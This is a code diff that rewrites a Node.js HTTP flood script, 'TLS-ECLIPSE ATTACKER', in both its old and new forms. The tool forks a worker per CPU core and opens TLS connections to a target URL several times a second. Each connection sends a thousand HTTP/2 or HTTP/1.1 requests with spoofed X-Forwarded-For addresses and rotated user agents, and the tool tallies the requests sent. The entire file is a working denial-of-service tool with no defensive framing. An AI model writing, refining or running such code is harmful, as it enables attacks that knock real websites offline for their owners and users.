@@ -1,119 +1,119 @@
+// TLS-ECLIPSE.js
+const fs = require('fs');
+const url = require('url');
+const http2 = require('http2');
+const tls = require('tls');
 const cluster = require('cluster');
 const os = require('os');
-const tls = require('tls');
-const http2 = require('http2');
-const url = require('url');
 
-const target = process.argv[2];
-const duration = parseInt(process.argv[3]) * 1000;
-if (!target || isNaN(duration)) {
-    console.log("Usage: node TLS-ECLIPSE.js <url> <duration_in_seconds>");
-    process.exit(1);
+if (process.argv.length !== 4) {
+    console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
+    process.exit(0);
 }
 
-const parsed = url.parse(target);
-const host = parsed.hostname;
-const port = 443;
-const path = parsed.path || '/';
+const target = process.argv[2];
+const duration = parseInt(process.argv[3]);
 
+const parsed = url.parse(target);
+const host = parsed.host;
+const path = parsed.path || '/';
+const port = 443;
+const cores = os.cpus().length;
 const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-    'Mozilla/5.0 (X11; Linux x86_64)',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
+    // Add more for max effect
 ];
 
 function randIP() {
-    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
+    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
 }
 
-function launchH2(socket) {
-    const client = http2.connect(parsed.href, {
-        createConnection: () => socket
-    });
-
-    client.on('error', () => {});
-
-    for (let i = 0; i < 1000; i++) {
-        const headers = {
-            ':method': 'GET',
-            ':path': path,
-            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'X-Forwarded-For': randIP(),
-            'Accept': '*/*',
-        };
-
-        const req = client.request(headers);
-        req.on('response', () => {});
-        req.end();
-    }
-}
-
-function buildSocket() {
-    return tls.connect({
-        host,
-        port,
-        servername: host,
-        rejectUnauthorized: false,
-        ALPNProtocols: ['h2', 'http/1.1'],
-    });
-}
-
-let loopCount = 0;
-
-function attackLoop() {
-    const socket = buildSocket();
-    socket.on('secureConnect', () => {
-        launchH2(socket);
-        setInterval(() => {
-            if (!socket.destroyed) {
-                launchH2(socket);
-                loopCount++;
-            }
-        }, 100);
-    });
-
-    socket.on('error', () => {});
-}
-
-function megaAttack() {
-    const endTime = Date.now() + duration;
-
-    console.log(`[+] Attack Started @ ${new Date().toLocaleTimeString()}`);
-    console.log(`[+] Target: ${target}`);
-    console.log(`[+] Duration: ${duration / 1000}s`);
-    console.log(`[+] Worker PID: ${process.pid}`);
-
-    const interval = setInterval(() => {
-        process.stdout.write(`\r[>] Running... Loops: ${loopCount} | Est. Req Sent: ${loopCount * 1000}`);
-    }, 500);
-
-    function loop() {
-        if (Date.now() >= endTime) {
-            clearInterval(interval);
-            console.log(`\n\n[!] Attack Finished @ ${new Date().toLocaleTimeString()}`);
-            console.log(`[+] Total Loops: ${loopCount}`);
-            console.log(`[+] Estimated Requests Sent: ${loopCount * 1000}`);
-            process.exit(0);
-        }
-        attackLoop();
-        setImmediate(loop);
-    }
-
-    loop();
+function rand(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 if (cluster.isMaster) {
-    const threads = os.cpus().length;
-    console.clear();
-    console.log("======================================");
-    console.log("         TLS-ECLIPSE ATTACKER         ");
-    console.log("======================================");
+    console.log(`======================================`);
+    console.log(`         TLS-ECLIPSE ATTACKER`);
+    console.log(`======================================`);
     console.log(`[+] Target     : ${target}`);
-    console.log(`[+] Duration   : ${duration / 1000}s`);
-    console.log(`[+] Cores Used : ${threads}`);
-    console.log("======================================\n");
+    console.log(`[+] Duration   : ${duration}s`);
+    console.log(`[+] Cores Used : ${cores}`);
+    console.log(`======================================`);
 
-    for (let i = 0; i < threads; i++) cluster.fork();
+    for (let i = 0; i < cores; i++) {
+        cluster.fork();
+    }
+
+    const start = new Date().toLocaleTimeString();
+    console.log(`\n[+] Attack Started @ ${start}`);
+
+    setTimeout(() => {
+        console.log(`\n[+] Attack Ended @ ${new Date().toLocaleTimeString()}`);
+        process.exit(1);
+    }, duration * 1000);
 } else {
-    megaAttack();
+    let loopCount = 0;
+
+    function launchAttack() {
+        const socket = tls.connect({
+            host,
+            port,
+            servername: host,
+            rejectUnauthorized: false,
+            ALPNProtocols: ['h2', 'http/1.1'],
+        });
+
+        socket.setKeepAlive(true, 1000);
+
+        socket.on('secureConnect', () => {
+            let protocol = socket.alpnProtocol;
+
+            if (protocol === 'h2') {
+                const client = http2.connect(parsed.href, {
+                    createConnection: () => socket
+                });
+
+                client.on('error', () => {});
+
+                for (let i = 0; i < 1000; i++) {
+                    const headers = {
+                        ':method': 'GET',
+                        ':path': path,
+                        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                        'x-forwarded-for': randIP(),
+                        'accept': '*/*'
+                    };
+
+                    const req = client.request(headers);
+                    req.on('response', () => {});
+                    req.end();
+                }
+
+                setTimeout(() => {
+                    client.close();
+                    socket.destroy();
+                }, 1500);
+            } else {
+                const req = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\nX-Forwarded-For: ${randIP()}\r\nConnection: keep-alive\r\n\r\n`;
+
+                for (let i = 0; i < 1000; i++) {
+                    socket.write(req);
+                }
+
+                setTimeout(() => socket.destroy(), 1500);
+            }
+
+            loopCount++;
+        });
+
+        socket.on('error', () => {});
+    }
+
+    const interval = setInterval(launchAttack, 200);
+
+    process.on('exit', () => {
+        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 1000} requests`);
+    });
 }
